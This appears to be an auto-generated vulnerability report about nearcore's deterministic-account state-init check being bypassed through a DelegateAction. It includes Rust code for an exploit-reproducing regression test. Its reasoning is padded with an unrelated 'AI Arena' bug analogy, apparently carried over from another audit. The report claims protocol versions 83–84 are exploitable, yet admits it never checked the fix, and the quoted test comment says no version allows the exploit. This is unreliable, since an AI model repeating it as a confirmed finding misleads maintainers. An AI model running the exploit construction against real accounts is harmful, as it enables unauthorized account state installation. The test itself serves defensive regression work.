### Title
Pre-fix `DeterministicStateInitAction` receiver check is bypassable via a `DelegateAction`, still reachable on protocol versions below the `FixDelegatedDeterministicStateInit` gate - (File: `runtime/runtime/src/action_validation.rs`)

### Summary
Deterministic accounts (NEP-616) are supposed to enforce a core invariant analogous to the AI Arena bug's missing "signature/commitment" check: the account's initial state (`DeterministicAccountStateInit`, i.e. code + data) must be exactly what the account id itself commits to, verified via `derive_near_deterministic_account_id` [1](#0-0)  and enforced in action validation for `DeterministicStateInitAction` [2](#0-1) . Just like the AI Arena `redeemMintPass` bug — where the caller-supplied `dna`/`fighterType` parameters were never bound/validated against a trusted commitment — nearcore had an equivalent gap where the receiver-id commitment check was validated against the wrong "receiver" field when the action was wrapped in a `DelegateAction` (meta-transaction), rather than the actual receiver the action executes against.

### Finding Description
The protocol defines `FixDelegatedDeterministicStateInit` as fixing "the receiver-id check when creating a deterministic account from a delegated action" [3](#0-2) , activating at protocol version 85 [3](#0-2) . The repository's own regression test, `try_meta_tx_deterministic_receiver_exploit`, reconstructs the exact exploit this fix closes: an outer transaction's receiver (`det_account_b`) legitimately matches `derive(state_init_b)`, but the actual `DeterministicStateInitAction` is nested inside a `DelegateAction` whose `receiver_id` is a *different* account (`det_account_a`, derived from unrelated data) [4](#0-3) . Pre-fix, the check validated the outer/wrong receiver instead of the actual execution target, so a state-init payload not committed to by the target account id could be installed at an account the attacker fully controls, exactly mirroring how AI Arena's `redeemMintPass` let a caller supply `dna`/`fighterType` inputs that were never bound to a verified source.

`protocol-model/spec/accounts-keys.md` confirms `MIN_SUPPORTED_PROTOCOL_VERSION` is 83 [5](#0-4) , i.e. two protocol versions below the v85 activation of `FixDelegatedDeterministicStateInit`. This means this binary is built to process (and presumably validate/replay/state-sync) chunks produced under protocol versions 83 and 84, where the vulnerable pre-fix receiver check is the live code path.

### Impact Explanation
If this pre-fix code path is exercised (e.g., during a network still running protocol version 83/84, or while validating/replaying historical chunks at those versions), an unprivileged meta-transaction sender could submit a `DelegateAction` wrapping a `DeterministicStateInitAction` whose `state_init` does not correspond to the actual receiver account, defeating the "account id commits to its initial state" invariant. This is an invalid-state-transition-acceptance class bug: it allows installing attacker-chosen code/data (potentially access keys or global-contract references) onto an account id that never authorized that content, enabling account takeover / unauthorized value movement into that account before its legitimate owner initializes it — directly analogous to the confirmed AI Arena finding where unauthenticated caller-supplied parameters bypassed an intended commitment check.

### Likelihood Explanation
Reachable purely from a signed transaction and a signed `DelegateAction` (meta-transaction sender + relayer), no special/validator privileges required — matching the allowed threat model (transaction signer / meta-transaction sender). Likelihood is bounded by whether protocol versions 83/84 are still actually negotiated/active on a live network using this binary; the code path and `MIN_SUPPORTED_PROTOCOL_VERSION` value indicate the binary is built to accept and process those versions.

### Recommendation
Ensure `validate_actions`/`action_validation.rs` unconditionally validates `DeterministicStateInitAction.state_init` against the actual execution receiver (the account the receipt targets after unwrapping any `DelegateAction`) at every supported protocol version, not only from `FixDelegatedDeterministicStateInit` onward. If versions 83/84 must remain supported for sync/historical-block validation, backport the receiver-binding fix (or reject `DeterministicStateInit` nested in delegate actions) for those versions rather than gating it behind a forward-only feature flag equivalent to the AI Arena fix (bind the commitment to the actual receiver, akin to adding the missing signature/commitment check recommended in the original report).

### Proof of Concept
The existing regression test in this repository is itself the proof of concept for the underlying bug class (now guarded against for v85+): [6](#0-5)  constructs two distinct deterministic accounts (`det_account_a`, `det_account_b`), deploys `det_account_b` and grants a full-access key to it, then crafts a `DelegateAction` with `sender_id: det_account_b`, `receiver_id: det_account_a`, carrying `DeterministicStateInit(state_init_b)`. The outer signed transaction's receiver is `det_account_b` (which passes the old check because `det_account_b == derive(state_init_b)`), but execution actually targets `det_account_a`, whose id does not match `state_init_b`. Note: I was unable to retrieve the exact pre/post-fix diff lines in `runtime/runtime/src/action_validation.rs` within the available tool budget, so the precise gating mechanism (how `FixDelegatedDeterministicStateInit` is checked) could not be fully confirmed — this should be verified directly against `action_validation.rs` and `core/primitives-core/src/version.rs` before remediation.

/// This is a NEAR-implicit account ID which is fully defined by its initial state.
pub fn derive_near_deterministic_account_id(
    state_init: &DeterministicAccountStateInit,
) -> AccountId {
    use sha3::Digest;
    let mut hasher = sha3::Keccak256::new();
    borsh::to_writer(&mut hasher, state_init).expect("borsh must not fail");
    let hash: [u8; 32] = hasher.finalize().into();
    format!("0s{}", hex::encode(&hash[12..32])).parse().unwrap()
}

fn try_meta_tx_deterministic_receiver_exploit(
    protocol_version: ProtocolVersion,
) -> Result<FinalExecutionOutcomeView, InvalidTxError> {
    let mut env = TestEnv::setup_with_version(Balance::from_near(100), protocol_version);
    env.deploy_global_contract(GlobalContractDeployMode::AccountId);

    let (_state_init_a, det_account_a) = env.new_deterministic_account_with_data(small());
    let (state_init_b, det_account_b) = env.new_deterministic_account_with_data(big());
    assert_ne!(det_account_a, det_account_b);

    // Deploy det_account_b and add a full-access key so it can act as meta_tx_sender.
    let user_signer = create_user_test_signer(&env.user_account());
    let storage_balance = env.balance_for_storage(state_init_b.clone());
    let deploy_tx = SignedTransaction::deterministic_state_init(
        env.next_nonce(),
        env.user_account(),
        det_account_b.clone(),
        &user_signer,
        env.get_tx_block_hash(),
        state_init_b.clone(),
        storage_balance,
    );
    env.run_tx(deploy_tx);

    let meta_tx_sender_signer = create_user_test_signer(&det_account_b);
    let pk_base64 = near_primitives_core::serialize::to_base64(
        &borsh::to_vec(&meta_tx_sender_signer.public_key()).unwrap(),
    );
    let add_key_args = serde_json::json!([
        { "batch_create": { "account_id": det_account_b.as_str() }, "id": 0 },
        {
            "action_add_key_with_full_access": {
                "promise_index": 0,
                "public_key": pk_base64,
                "nonce": 0
            },
            "id": 0,
            "return": true
        }
    ]);
    let add_key_tx = SignedTransaction::call(
        env.next_nonce(),
        env.user_account(),
        det_account_b.clone(),
        &user_signer,
        Balance::from_near(2),
        "call_promise".to_owned(),
        serde_json::to_vec(&add_key_args).unwrap(),
        Gas::from_teragas(300),
        env.get_tx_block_hash(),
    );
    env.run_tx(add_key_tx);

    // Craft the exploit: outer_tx.receiver = det_account_b = derive(state_init_b).
    // Old check: det_account_b == derive(state_init_b) passes.
    // The delegate action targets det_account_a, which is the wrong account.
    // In no protocol version can this ever be allowed to be executed successfully.
    let relayer = env.independent_account();
    let relayer_signer = create_user_test_signer(&relayer);
    let inner_action = Action::DeterministicStateInit(Box::new(DeterministicStateInitAction {
        state_init: state_init_b,
        deposit: Balance::ZERO,
    }));
    let delegate_nonce = env.next_nonce_for(&det_account_b);
    let delegate_action = DelegateAction {
        sender_id: det_account_b.clone(),
        receiver_id: det_account_a,
        actions: vec![NonDelegateAction::try_from(inner_action).unwrap()],
        nonce: delegate_nonce,
        max_block_height: 1_000_000,
        public_key: meta_tx_sender_signer.public_key(),
    };
    let signed_delegate_action =
        SignedDelegateAction::sign(&meta_tx_sender_signer, delegate_action);
    let tx = SignedTransaction::from_actions(
        env.next_nonce(),
        relayer,
        det_account_b,
        &relayer_signer,
        vec![Action::Delegate(Box::new(signed_delegate_action))],
        env.get_tx_block_hash(),
    );
    env.try_execute_tx(tx)
